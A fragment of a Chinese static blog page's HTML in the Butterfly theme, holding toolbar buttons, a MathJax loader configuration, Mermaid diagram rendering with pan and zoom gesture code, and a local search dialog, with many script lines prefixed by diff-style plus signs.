id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.1.0/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script><script>(() => {
+  const parseViewBox = viewBox => {
+    if (!viewBox) return null
+    const parts = viewBox.trim().split(/[\s,]+/).map(n => Number(n))
+    if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return null
+    return parts
+  }
+
+  const getSvgViewBox = svg => {
+    const attr = parseViewBox(svg.getAttribute('viewBox'))
+    if (attr) return attr
+
+    // Fallback: use bbox to build a viewBox
+    try {
+      const bbox = svg.getBBox()
+      if (bbox && bbox.width && bbox.height) return [bbox.x, bbox.y, bbox.width, bbox.height]
+    } catch (e) {
+      // getBBox may fail on some edge cases; ignore
+    }
+
+    const w = Number(svg.getAttribute('width')) || 0
+    const h = Number(svg.getAttribute('height')) || 0
+    if (w > 0 && h > 0) return [0, 0, w, h]
+    return [0, 0, 100, 100]
+  }
+
+  const setSvgViewBox = (svg, vb) => {
+    svg.setAttribute('viewBox', `${vb[0]} ${vb[1]} ${vb[2]} ${vb[3]}`)
+  }
+
+  const clamp = (v, min, max) => Math.max(min, Math.min(max, v))
+
+  const openSvgInNewTab = ({ source, initViewBox }) => {
+    const getClonedSvg = () => {
+      if (typeof source === 'string') {
+        const template = document.createElement('template')
+        template.innerHTML = source.trim()
+        const svg = template.content.querySelector('svg')
+        return svg ? svg.cloneNode(true) : null
+      }
+      if (source && typeof source.cloneNode === 'function') {
+        return source.cloneNode(true)
+      }
+      return null
+    }
+
+    const clone = getClonedSvg()
+    if (!clone) return
+    if (initViewBox && initViewBox.length === 4) {
+      clone.setAttribute('viewBox', initViewBox.join(' '))
+    }
+    if (!clone.getAttribute('xmlns')) clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg')
+    if (!clone.getAttribute('xmlns:xlink') && clone.outerHTML.includes('xlink:')) {
+      clone.setAttribute('xmlns:xlink', 'http://www.w3.org/1999/xlink')
+    }
+    // inject background to match current theme
+    const isDark = document.documentElement.getAttribute('data-theme') === 'dark'
+    const bg = getComputedStyle(document.body).backgroundColor || (isDark ? '#1e1e1e' : '#ffffff')
+    if (!clone.style.background) clone.style.background = bg
+
+    const serializer = new XMLSerializer()
+    const svgSource = serializer.serializeToString(clone)
+    const htmlSource = `<!doctype html><html><head><meta charset="utf-8" />
+      <style>
+        html, body { width: 100%; height: 100%; margin: 0; display: flex; align-items: center; justify-content: center; background: ${bg}; }
+        svg { max-width: 100%; max-height: 100%; height: auto; width: auto; }
+      </style>
+      </head><body>${svgSource}</body></html>`
+    const blob = new Blob([htmlSource], { type: 'text/html;charset=utf-8' })
+    const url = URL.createObjectURL(blob)
+    window.open(url, '_blank', 'noopener')
+    setTimeout(() => URL.revokeObjectURL(url), 30000)
+  }
+
+  const attachMermaidViewerButton = wrap => {
+    let btn = wrap.querySelector('.mermaid-open-btn')
+    if (!btn) {
+      btn = document.createElement('button')
+      btn.type = 'button'
+      btn.className = 'mermaid-open-btn'
+      wrap.appendChild(btn)
+    }
+
+    btn.innerHTML = '<i class="fa fa-search fa-fw" aria-hidden="true"></i>'
+
+    if (!btn.__mermaidViewerBound) {
+      btn.addEventListener('click', e => {
+        e.preventDefault()
+        e.stopPropagation()
+        const svg = wrap.__mermaidOriginalSvg || wrap.querySelector('svg')
+        if (!svg) return
+        const initViewBox = wrap.__mermaidInitViewBox
+        if (typeof svg === 'string') {
+          openSvgInNewTab({ source: svg, initViewBox })
+          return
+        }
+        openSvgInNewTab({ source: svg, initViewBox })
+      })
+      btn.__mermaidViewerBound = true
+    }
+  }
+
+  // Zoom around a point (px, py) in the SVG viewport (in viewBox coordinates)
+  const zoomAtPoint = (vb, factor, px, py) => {
+    const w = vb[2] * factor
+    const h = vb[3] * factor
+    const nx = px - (px - vb[0]) * factor
+    const ny = py - (py - vb[1]) * factor
+    return [nx, ny, w, h]
+  }
+
+  const initMermaidGestures = wrap => {
+    const svg = wrap.querySelector('svg')
+    if (!svg) return
+
+    // Ensure viewBox exists so gestures always work
+    const initVb = getSvgViewBox(svg)
+    wrap.__mermaidInitViewBox = initVb
+    wrap.__mermaidCurViewBox = initVb.slice()
+    setSvgViewBox(svg, initVb)
+
+    // Avoid binding multiple times on themeChange/pjax
+    if (wrap.__mermaidGestureBound) return
+    wrap.__mermaidGestureBound = true
+
+    // Helper: map client (viewport) coordinate -> viewBox coordinate
+    const clientToViewBox = (clientX, clientY) => {
+      const rect = svg.getBoundingClientRect()
+      const vb = wrap.__mermaidCurViewBox || getSvgViewBox(svg)
+      const x = vb[0] + (clientX - rect.left) * (vb[2] / rect.width)
+      const y = vb[1] + (clientY - rect.top) * (vb[3] / rect.height)
+      return { x, y, rect, vb }
+    }
+
+    const state = {
+      pointers: new Map(),
+      startVb: null,
+      startDist: 0,
+      startCenter: null
+    }
+
+    const clampVb = vb => {
+      const init = wrap.__mermaidInitViewBox || vb
+      const minW = init[2] * 0.1
+      const maxW = init[2] * 10
+      const minH = init[3] * 0.1
+      const maxH = init[3] * 10
+      vb[2] = clamp(vb[2], minW, maxW)
+      vb[3] = clamp(vb[3], minH, maxH)
+      return vb
+    }
+
+    const setCurVb = vb => {
+      vb = clampVb(vb)
+      wrap.__mermaidCurViewBox = vb
+      setSvgViewBox(svg, vb)
+    }
+
+    const onPointerDown = e => {
+      // Allow only primary button for mouse
+      if (e.pointerType === 'mouse' && e.button !== 0) return
+      svg.setPointerCapture(e.pointerId)
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      if (state.pointers.size === 1) {
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      } else if (state.pointers.size === 2) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        state.startDist = Math.hypot(dx, dy)
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        state.startCenter = { x: (pts[0].x + pts[1].x) / 2, y: (pts[0].y + pts[1].y) / 2 }
+      }
+    }
+
+    const onPointerMove = e => {
+      if (!state.pointers.has(e.pointerId)) return
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      // Pan with 1 pointer
+      if (state.pointers.size === 1 && state.startVb) {
+        const p = [...state.pointers.values()][0]
+        const prev = { x: e.clientX - e.movementX, y: e.clientY - e.movementY }
+        // movementX/Y unreliable on touch, compute from stored last position
+        const last = wrap.__mermaidLastSinglePointer || p
+        const dxClient = p.x - last.x
+        const dyClient = p.y - last.y
+        wrap.__mermaidLastSinglePointer = p
+
+        const { rect } = clientToViewBox(p.x, p.y)
+        const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        const dx = dxClient * (vb[2] / rect.width)
+        const dy = dyClient * (vb[3] / rect.height)
+        setCurVb([vb[0] - dx, vb[1] - dy, vb[2], vb[3]])
+        return
+      }
+
+      // Pinch zoom with 2 pointers
+      if (state.pointers.size === 2 && state.startVb && state.startDist > 0) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        const dist = Math.hypot(dx, dy)
+        if (!dist) return
+        const factor = state.startDist / dist // dist bigger => zoom in (viewBox smaller)
+
+        const cx = (pts[0].x + pts[1].x) / 2
+        const cy = (pts[0].y + pts[1].y) / 2
+        const centerClient = { x: cx, y: cy }
+
+        const pxy = clientToViewBox(centerClient.x, centerClient.y)
+        const cpx = pxy.x
+        const cpy = pxy.y
+
+        const vb = zoomAtPoint(state.startVb, factor, cpx, cpy)
+        setCurVb(vb)
+      }
+    }
+
+    const onPointerUpOrCancel = e => {
+      state.pointers.delete(e.pointerId)
+      if (state.pointers.size === 0) {
+        state.startVb = null
+        state.startDist = 0
+        state.startCenter = null
+        wrap.__mermaidLastSinglePointer = null
+      } else if (state.pointers.size === 1) {
+        // reset single pointer baseline to avoid jump
+        wrap.__mermaidLastSinglePointer = [...state.pointers.values()][0]
+      }
+    }
+
+    // Wheel zoom (mouse/trackpad)
+    const onWheel = e => {
+      // ctrlKey on mac trackpad pinch; we treat both as zoom
+      e.preventDefault()
+      const delta = e.deltaY
+      const zoomFactor = delta > 0 ? 1.1 : 0.9
+      const { x, y } = clientToViewBox(e.clientX, e.clientY)
+      const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      setCurVb(zoomAtPoint(vb, zoomFactor, x, y))
+    }
+
+    const onDblClick = () => {
+      const init = wrap.__mermaidInitViewBox
+      if (!init) return
+      wrap.__mermaidCurViewBox = init.slice()
+      setSvgViewBox(svg, init)
+    }
+
+    svg.addEventListener('pointerdown', onPointerDown)
+    svg.addEventListener('pointermove', onPointerMove)
+    svg.addEventListener('pointerup', onPointerUpOrCancel)
+    svg.addEventListener('pointercancel', onPointerUpOrCancel)
+    svg.addEventListener('wheel', onWheel, { passive: false })
+    svg.addEventListener('dblclick', onDblClick)
+  }
+
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+
+      // Clear old render (themeChange/pjax will rerun)
+      const oldSvg = item.querySelector('svg')
+      if (oldSvg) oldSvg.remove()
+      item.__mermaidGestureBound = false
+
+      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
+      if (!config.theme) {
+        config.theme = theme
+      }
+      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+        if (false) initMermaidGestures(item)
+        item.__mermaidOriginalSvg = svg
+        if (false) attachMermaidViewerButton(item)
+      }
+
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.2/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="/js/github-chart.js"></script><script src="/live2d-widget/autoload.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索知识库" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
